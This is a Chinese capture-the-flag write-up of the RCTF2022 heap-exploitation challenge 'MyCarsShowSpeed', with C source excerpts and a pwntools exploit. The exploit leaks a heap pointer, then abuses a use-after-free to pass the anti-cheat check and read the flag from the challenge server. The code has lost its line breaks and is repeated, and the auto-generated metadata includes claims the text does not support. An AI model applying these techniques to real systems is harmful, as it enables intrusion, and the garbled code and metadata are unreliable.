---
title: RCTF2022 MyCarsShowSpeed 题目分析
contest: RCTF 2022
year: 2023
difficulty: hard
vuln_type: heap_exploit
tags:
- pwn
- ncurses-game
- winTimes-cnt
- fake-flag-purchase
- uaf
- car-shop
- double-free
attack_chain:
- 赛车主题 PWN 游戏：菜单 start/show/visit/switch
- 'visit 商店: buy/sell/fix/fetch 4 项 + 5 项商品 (NormalCar/SuperCar/LongCar/GhostCar/flag)'
- 关键：winTimes<1000 时 buy('flag') 触发 cheat 检测 → 全 free curCar
- start() 触发 winTimes++/money+=10 (每次赢得比赛)
- fetch('') 空名修复触发 fetchTime=0 漏洞
- fix('') 同样空名触发
- 泄 heap 通过 switch(4) 接收 CarName 6 字节 = heap 指针
- heap = u64(name+'\0\0\0') - 0x5e0
- fix(name) 多次触发 memory corruption
- buy('NormalCar', p64(heap+0x330)[:6]) 二次购买注入指针
- buy('NormalCar', 'ssss') 触发 fake chunk 利用
- buy('flag') 最终触发 flag 字符串读取 (绕过 cheat 检测)
key_payload: buy('NormalCar', p64(heap+0x330)[:6]) + buy('NormalCar', p64(heap+0x330)[:6]) + buy('NormalCar', 'ssss') + buy('flag')
one_liner: RCTF2022 赛车游戏 PWN：ncurses 菜单 + winTimes 计数器 + cheat 检测触发 free + 空名 fix/fetch 漏洞 + 6 字节 carName 泄 heap 指针。
lesson: 字符串结尾 \0\0\0 补齐 u64 解析是固定套路；fix/fetch 用空字符串触发漏洞是赛车游戏常见挖法；多次 buy 注入 fake heap pointer 是 car list 类题目常见利用。
quality: medium
full_path: RCTF2022-MyCarsShowSpeed_题目分析.full.md
meta_path: RCTF2022-MyCarsShowSpeed_题目分析.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 'RCTF2022 MyCarsShowSpeed 题目分析。RCTF2022 赛车游戏 PWN：ncurses 菜单 + winTimes 计数器 + cheat 检测触发 free + 空名 fix/fetch 漏洞 + 6 字节 carName 泄 heap 指针。。关键路径：赛车主题 PWN 游戏：菜单 start/show/visit/switch → visit 商店: buy/s...'
category: pwn
subcategory: heap_exploitation
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/96073.html
reasoning_chain:
- 二进制 game_t 结构含 winTimes/money + 5 商品 (含 flag) → 触发点：buy('flag') 的 cheat 检测
- 源码看到 winTimes<1000 时 cheat 检测 → 全 free curCar → 假设：UAF + fake chunk 入口
- 假设：fix('')/fetch('') 空名触发 fetchTime=0 → 动作：连发 255 次 fix('') 观察
- switch(4) 返回 CarName 6 字节 → 假设：6 字节是 heap 指针 → 动作：u64(name+'\0\0\0')-0x5e0 拿 heap_base
- 观察：buy('NormalCar', p64(heap+0x330)[:6]) 二次购买注入指针 → 假设：fake chunk
- 动作：buy('NormalCar','ssss') 触发 fake chunk 利用 → 观察：carList 指针被改
- buy('flag') 触发 ./flag 读取 → 假设：winTimes 校验需绕过 → 动作：完成
failed_attempts:
- 试图直接 winTimes++ → 失败：竞态复杂，cheat 检测强
- 试图覆盖 carList→car 指针链 → 失败：未先泄 heap
- 单次 fix('') 不够 → 失败：必须 255 次循环
key_observations:
- 6 字节 CarName + '\0\0\0' 补齐 u64 解析是固定套路
- fix/fetch 空字符串触发 fetchTime=0 是赛车游戏常见挖法
- winTimes<1000 cheat 检测是反作弊 + 反利用双重门
- 多次 buy 注入 fake heap pointer 是 car list 类题目利用模式
prerequisites:
- glibc heap chunk 结构 (size/fd/bk)
- ncurses 菜单交互理解
- pwntools 6 字节 + '\0' 补齐技巧
- UAF + fake chunk 经典利用链
---
# RCTF2022-MyCarsShowSpeed 题目分析

> 原文: https://www.ctfiot.com/96073.html
> ID: 96073

一

正向分析

二

源码分析

//store.hstruct game{ void (*printRules)(); void (*showCars)(game_t *_this); void (*showInfo)(game_t *_this); int (*checkCar)(game_t *_this); void (*startGame)(game_t *_this); void (*switchCars)(game_t *_this); void (*compete)(game_t *_this); void (*visitStore)(game_t *_this); void (*menu)(void); void (*printBanner)(); void (*readInput)(game_t *_this); void (*finishGame)(game_t *_this); store_t *store; road_t *road; car_t *userCar; car_t *botCar; carList_t *carList; uint32_t money; int winCol; uint32_t winTimes;};

else if(strcmp(goods->name, "flag") == 0){ if(game->winTimes < 1000) { puts("No! You cheated in this game! Where did your money come from?n"); puts("Punish for cheaters!nYour cars are confiscated!"); carList_t *curCar = game->carList; while(curCar) { car_t *car = curCar->car; if(car) { free(car); curCar->car = NULL; } curCar = curCar->next; } game->carList->carNums = 0; game->userCar = NULL; } else { int fd; char buf[64]; puts("You've earned it!"); puts("Here is your flag!"); fd = open("./flag", O_RDONLY); if(fd >= 0) { read(fd, buf, 64); write(1, buf, 64); } } return; }

void startGameImpl(game_t *_this){ int ch; if(_this->checkCar(_this) == 0) return ; initBoard(); _this->userCar->col = USER_COL; _this->botCar->col = BOT_COL; road_t *road = _this->road; if(road != NULL) { road->buildRoad(road, ROAD_BLOCKS); road->printEnd(road); } _this->printBanner(); _this->userCar->printCar(_this->userCar); _this->botCar->printCar(_this->botCar); while(1) { ch = getch(); if(ch == 'q' || ch == 'Q') goto End; if(ch == ' ') break; } _this->compete(_this); End: _this->finishGame(_this); clear(); endwin();}

if(isSlip(p)){ char msg[] = "You are luck!nYour car's perfomrance increased!"; mvprintw(MSG_ROW + 1, (winCol - strlen(msg)) / 2, "%s", msg); steps += 0.1; if(steps == 1.0) { steps = 0; _this->userCar->step += 1; } if(_this->userCar->stability < 100) _this->userCar->stability++; _this->userCar->performance++;}

fetchTime = fetchHour * 3600 + fetchMin * 60 + fetchSec * fixDifficulty;// 0fixTime = fixHour * 3600 + fixMin * 60 + fixSec;

void finishGameImpl(game_t *_this){ car_t *car = _this->userCar; int fuelCost, healthCost; int p = 10; static double steps; fuelCost = car->col / 10; healthCost = car->col / 5; car->health -= healthCost; car->fuel -= fuelCost; if(car->health < 0) car->health = 0; if(car->fuel < 0) car->fuel = 0; car->fixDifficulty++; if(isSlip(p)) { char msg[] = "You are luck!nYour car's perfomrance increased!"; mvprintw(MSG_ROW + 1, (winCol - strlen(msg)) / 2, "%s", msg); steps += 0.1; if(steps == 1.0) { steps = 0; _this->userCar->step += 1; } if(_this->userCar->stability < 100) _this->userCar->stability++; _this->userCar->performance++; } attron(COLOR_PAIR(1)); if(_this->botCar->isWon) { int ch; char msg[] = "You lose! Press enter to quit..."; _this->botCar->isWon = 0; if(car->stability < _this->botCar->stability) { car->stability += 5; car->performance ++; } mvprintw(BANNER_ROW + 3, (winCol - strlen(msg)) / 2, "%s", msg); while((ch = getch()) != 'n'); } else if(_this->userCar->isWon) { int ch; _this->winTimes++; _this->userCar->isWon = 0; _this->money += 10; mvprintw(BANNER_ROW + 3, (winCol - 10) / 2, "%s", "You Won!!! Press enter to quit..."); while((ch = getch()) != 'n'); } attroff(COLOR_PAIR(1));}

三

exp编写

def choice(idx): p.sendlineafter(b'> ',str(idx))def entered(s): p.sendlineafter(b'> ',s) def start(): choice(1) p.recvuntil('`-(_)--(_)-`') p.send('q') #3p.recvall() #p.send(' ')def show(): choice(2)def visit(): choice(3)def switch(): choice(4)def buy(t,name=None): choice(1) entered(t) if 'Car' in t: entered(name)def sell(name): choice(2) entered(name)def fix(name): choice(3) entered(name)def fetch(name): choice(4) entered(name)def leave(): choice(5)

visit()buy('NormalCar','ss')leave() for i in range(255): print(i) start()

visit()buy('NormalCar','ss')leave() for i in range(255): print(i) start()visit() for i in range(100): fix('ss') fetch('ss')

visit()buy('NormalCar','ss')leave() for i in range(255): print(i) start()visit() for i in range(100): fix('ss') fetch('ss') fix('ss')buy('flag')

visit()buy('NormalCar','ss')leave() for i in range(255): print(i) start()visit() for i in range(100): fix('ss') fetch('ss') fix('ss')buy('flag') fetch('')fix('')buy('flag')choice(4)p.recvuntil('CarName: ')name=p.recv(6)

visit()buy('NormalCar','ss')leave() for i in range(255): print(i) start()visit() for i in range(100): fix('ss') fetch('ss') fix('ss')buy('flag') fetch('')fix('')buy('flag') choice(4) p.recvuntil('CarName: ')name=p.recv(6) heap=u64(name+b'  ')-0x5e0success('heap: '+hex(heap))p.sendline(name)fix(name)buy('flag')success('heap: '+hex(heap+0x330))

buy('NormalCar',p64(heap+0x330)[:6])buy('NormalCar',p64(heap+0x330)[:6])buy('NormalCar','ssss')buy('flag')

from pwn import * #p=process('./SpeedGame')#context.log_level='debug'p=remote('49.0.206.171', 9999)def choice(idx): p.sendlineafter(b'> ',str(idx))def entered(s): p.sendlineafter(b'> ',s) def start(): choice(1) p.recvuntil('`-(_)--(_)-`') p.send('q') #3p.recvall() #p.send(' ')def show(): choice(2)def visit(): choice(3)def switch(): choice(4)'''Goods: NormalCar Price: 50Goods: SuperCar Price: 100Goods: LongCar Price: 180Goods: GhostCar Price: 200Goods: Fuel Price: 10Goods: NormalTire Price: 20Goods: SuperTire Price: 80Goods: flag Price: 9999'''def buy(t,name=None): choice(1) entered(t) if 'Car' in t: entered(name)def sell(name): choice(2) entered(name)def fix(name): choice(3) entered(name)def fetch(name): choice(4) entered(name)def leave(): choice(5) visit()buy('NormalCar','ss')leave() for i in range(255): print(i) start()visit() for i in range(100): fix('ss') fetch('ss') fix('ss')buy('flag') fetch('')fix('')buy('flag') choice(4) p.recvuntil('CarName: ')name=p.recv(6) heap=u64(name+b'  ')-0x5e0success('heap: '+hex(heap))p.sendline(name)fix(name)buy('flag')success('heap: '+hex(heap+0x330)) buy('NormalCar',p64(heap+0x330)[:6])buy('NormalCar',p64(heap+0x330)[:6])buy('NormalCar','ssss')buy('flag') #gdb.attach(p)p.interactive()

四

小结

看雪ID：xi@0ji233

https://bbs.kanxue.com/user-home-919002.htm

*本文由看雪论坛 xi@0ji233 原创，转载请注明来自看雪社区

# 往期推荐

1.MRCTF2022 stuuuuub 题解

2.APT 摩诃草样本分析

3.初探DLL注入

4.Redis常见利用方法

5.一道pwn题解析之jarvisoj_fm

6.Windows内核模糊测试之IoControl Fuzz

球分享

球点赞

球在看

点击“阅读原文”，了解更多！


```
一
正向分析
二
源码分析
//store.hstruct game{ void (*printRules)(); void (*showCars)(game_t *_this); void (*showInfo)(game_t *_this); int (*checkCar)(game_t *_this); void (*startGame)(game_t *_this); void (*switchCars)(game_t *_this); void (*compete)(game_t *_this); void (*visitStore)(game_t *_this); void (*menu)(void); void (*printBanner)(); void (*readInput)(game_t *_this); void (*finishGame)(game_t *_this); store_t *store; road_t *road; car_t *userCar; car_t *botCar; carList_t *carList; uint32_t money; int winCol; uint32_t winTimes;};
else if(strcmp(goods->name, "flag") == 0){ if(game->winTimes < 1000) { puts("No! You cheated in this game! Where did your money come from?n"); puts("Punish for cheaters!nYour cars are confiscated!"); carList_t *curCar = game->carList; while(curCar) { car_t *car = curCar->car; if(car) { free(car); curCar->car = NULL; } curCar = curCar->next; } game->carList->carNums = 0; game->userCar = NULL; } else { int fd; char buf[64]; puts("You've earned it!"); puts("Here is your flag!"); fd = open("./flag", O_RDONLY); if(fd >= 0) { read(fd, buf, 64); write(1, buf, 64); } } return; }
void startGameImpl(game_t *_this){ int ch; if(_this->checkCar(_this) == 0) return ; initBoard(); _this->userCar->col = USER_COL; _this->botCar->col = BOT_COL; road_t *road = _this->road; if(road != NULL) { road->buildRoad(road, ROAD_BLOCKS); road->printEnd(road); } _this->printBanner(); _this->userCar->printCar(_this->userCar); _this->botCar->printCar(_this->botCar); while(1) { ch = getch(); if(ch == 'q' || ch == 'Q') goto End; if(ch == ' ') break; } _this->compete(_this); End: _this->finishGame(_this); clear(); endwin();}
if(isSlip(p)){ char msg[] = "You are luck!nYour car's perfomrance increased!"; mvprintw(MSG_ROW + 1, (winCol - strlen(msg)) / 2, "%s", msg); steps += 0.1; if(steps == 1.0) { steps = 0; _this->userCar->step += 1; } if(_this->userCar->stability < 100) _this->userCar->stability++; _this->userCar->performance++;}
fetchTime = fetchHour * 3600 + fetchMin * 60 + fetchSec * fixDifficulty;// 0fixTime = fixHour * 3600 + fixMin * 60 + fixSec;
void finishGameImpl(game_t *_this){ car_t *car = _this->userCar; int fuelCost, healthCost; int p = 10; static double steps; fuelCost = car->col / 10; healthCost = car->col / 5; car->health -= healthCost; car->fuel -= fuelCost; if(car->health < 0) car->health = 0; if(car->fuel < 0) car->fuel = 0; car->fixDifficulty++; if(isSlip(p)) { char msg[] = "You are luck!nYour car's perfomrance increased!"; mvprintw(MSG_ROW + 1, (winCol - strlen(msg)) / 2, "%s", msg); steps += 0.1; if(steps == 1.0) { steps = 0; _this->userCar->step += 1; } if(_this->userCar->stability < 100) _this->userCar->stability++; _this->userCar->performance++; } attron(COLOR_PAIR(1)); if(_this->botCar->isWon) { int ch; char msg[] = "You lose! Press enter to quit..."; _this->botCar->isWon = 0; if(car->stability < _this->botCar->stability) { car->stability += 5; car->performance ++; } mvprintw(BANNER_ROW + 3, (winCol - strlen(msg)) / 2, "%s", msg); while((ch = getch()) != 'n'); } else if(_this->userCar->isWon) { int ch; _this->winTimes++; _this->userCar->isWon = 0; _this->money += 10; mvprintw(BANNER_ROW + 3, (winCol - 10) / 2, "%s", "You Won!!! Press enter to quit..."); while((ch = getch()) != 'n'); } attroff(COLOR_PAIR(1));}
三
exp编写
def choice(idx): p.sendlineafter(b'> ',str(idx))def entered(s): p.sendlineafter(b'> ',s) def start(): choice(1) p.recvuntil('`-(_)--(_)-`') p.send('q') #3p.recvall() #p.send(' ')def show(): choice(2)def visit(): choice(3)def switch(): choice(4)def buy(t,name=None): choice(1) entered(t) if 'Car' in t: entered(name)def sell(name): choice(2) entered(name)def fix(name): choice(3) entered(name)def fetch(name): choice(4) entered(name)def leave(): choice(5)
visit()buy('NormalCar','ss')leave() for i in range(255): print(i) start()
visit()buy('NormalCar','ss')leave() for i in range(255): print(i) start()visit() for i in range(100): fix('ss') fetch('ss')
visit()buy('NormalCar','ss')leave() for i in range(255): print(i) start()visit() for i in range(100): fix('ss') fetch('ss') fix('ss')buy('flag')
visit()buy('NormalCar','ss')leave() for i in range(255): print(i) start()visit() for i in range(100): fix('ss') fetch('ss') fix('ss')buy('flag') fetch('')fix('')buy('flag')choice(4)p.recvuntil('CarName: ')name=p.recv(6)
visit()buy('NormalCar','ss')leave() for i in range(255): print(i) start()visit() for i in range(100): fix('ss') fetch('ss') fix('ss')buy('flag') fetch('')fix('')buy('flag') choice(4) p.recvuntil('CarName: ')name=p.recv(6) heap=u64(name+b'  ')-0x5e0success('heap: '+hex(heap))p.sendline(name)fix(name)buy('flag')success('heap: '+hex(heap+0x330))
buy('NormalCar',p64(heap+0x330)[:6])buy('NormalCar',p64(heap+0x330)[:6])buy('NormalCar','ssss')buy('flag')
from pwn import * #p=process('./SpeedGame')#context.log_level='debug'p=remote('49.0.206.171', 9999)def choice(idx): p.sendlineafter(b'> ',str(idx))def entered(s): p.sendlineafter(b'> ',s) def start(): choice(1) p.recvuntil('`-(_)--(_)-`') p.send('q') #3p.recvall() #p.send(' ')def show(): choice(2)def visit(): choice(3)def switch(): choice(4)'''Goods: NormalCar Price: 50Goods: SuperCar Price: 100Goods: LongCar Price: 180Goods: GhostCar Price: 200Goods: Fuel Price: 10Goods: NormalTire Price: 20Goods: SuperTire Price: 80Goods: flag Price: 9999'''def buy(t,name=None): choice(1) entered(t) if 'Car' in t: entered(name)def sell(name): choice(2) entered(name)def fix(name): choice(3) entered(name)def fetch(name): choice(4) entered(name)def leave(): choice(5) visit()buy('NormalCar','ss')leave() for i in range(255): print(i) start()visit() for i in range(100): fix('ss') fetch('ss') fix('ss')buy('flag') fetch('')fix('')buy('flag') choice(4) p.recvuntil('CarName: ')name=p.recv(6) heap=u64(name+b'  ')-0x5e0success('heap: '+hex(heap))p.sendline(name)fix(name)buy('flag')success('heap: '+hex(heap+0x330)) buy('NormalCar',p64(heap+0x330)[:6])buy('NormalCar',p64(heap+0x330)[:6])buy('NormalCar','ssss')buy('flag') #gdb.attach(p)p.interactive()
四
小结
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]